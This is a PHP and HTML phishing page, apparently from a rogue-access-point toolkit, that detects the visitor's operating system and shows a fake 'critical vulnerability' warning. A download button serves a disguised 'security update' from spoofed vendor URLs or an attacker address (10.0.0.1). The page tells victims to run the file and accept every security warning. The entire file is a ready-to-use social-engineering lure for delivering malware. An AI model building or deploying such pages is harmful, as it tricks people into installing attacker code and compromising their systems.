<?php
// g0tmi1k
if (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
      $OS = "Linux";
    $file = "http://security.linux.org/kernel_1.83.90-5+lenny2_i386.deb";
}
 elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'mac') !== FALSE) {
      $OS = "OSX";
    $file = "http://update.apple.com/SecurityUpdate1-83-90-5.dmg.bin";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'win') !== FALSE) {
      $OS = "Windows";
    #$file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
    $file = "http://update.microsoft.com/Windows-KB183905-x86-ENU.exe";
} else {
      $OS = "your operating system";
    $file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
<link rel="StyleSheet" href="style.css" type="text/css" media="all">
<link rel="shortcut icon" href="<?php echo "http://".$_SERVER['HTTP_HOST']."/favicon.ico"; ?>">
<title>Critical Vulnerability</title>
</head>
<body bgcolor="#ffffff" text="#000000">
<table class="menuTop-bg" border="0" cellpadding="0" cellspacing="0" width="100%">
 <tbody><tr><td align="left">
  <table class="menuTop-bg" border="0" cellpadding="0" cellspacing="2">
   <tbody><tr><td width="100%"><br><span class="date-font"><?php echo date("l F j, Y"); ?></span><br></td></tr></tbody>
  </table>
 </td></tr></tbody>
</table>
<table bgcolor="#d7d7dc" border="0" cellpadding="0" cellspacing="0" width="100%"><tbody>
 <tr><td colspan="2" bgcolor="#000000" height="1"></td></tr>
 <tr><td align="right" valign="middle">
  <table border="0" cellpadding="0" cellspacing="2"><tbody><tr>
   <td><a href="#" class="menuTop">Home</a></td>
   <td><a href="#" class="menuTop">FAQ</a></td>
   <td><a href="#" class="menuTop">Help</a></td>
  </tr></tbody></table>
 </td></tr>
 <tr><td colspan="2" bgcolor="#000000" height="1"></td></tr>
</tbody></table>
<table border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr>
 <td class="sidebar-bg" align="left" valign="top" width="156"><table border="0" cellpadding="0" cellspacing="0" width="156">
  <span class="menutitle">Links:</span>
  <a href="#" class="menu">Home</a>
  <a href="#" class="menu">FAQ</a>
  <a href="#" class="menu">Help</a>
  <td class="sidebar-line" width="156"><br>
 </td>
</tr></tbody></table>
<td class="pagelines" align="right" valign="top" width="1" height="750"><br></td>
<td class="main-tablebg" align="left" valign="top"><br>
 <table border="0" cellpadding="0" cellspacing="20" width="100%"><tbody><tr><td class="just" valign="top">
 <img src="<?php echo "http://".$_SERVER['HTTP_HOST']."/$OS.jpg"; ?>" alt="<?php echo "$OS"; ?>" width="100" height="100" ALIGN="RIGHT">
 <h2>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?></h2>
 <b>It is essential that you update your system before continuing.<br><br>
 Sorry for any inconvenience caused.</b>
<br><br><br><br><br>
<div class="buttons" align="center"><a class="positive" name="save" href="#" onclick="window.open('<?php echo "$file"; ?>','download'); return false;"><img src="<?php echo "http://".$_SERVER['HTTP_HOST']."/tick.png"; ?>" alt=""> Download Update</a></div>
<br><br><br><br><br>
<h3>How to update: </h3>
1.) Click on the link above to begin the download process.<br>
2.) You will be asked if you want to save the file. Click the "run" button.<br>
3.) Wait for the download to complete. <br>
4.) Click "Allow/Ok" to any security warning. <br>
5.) After the update is apply, you will be able to surf the internet<br><br>
<i> Please note: The update may take up to 2 minutes to complete. </i>
 </td></tr></tbody></table>
</td>
<tr><td class="pagelines" height="1" width="10"></td></tr>
</body></html>
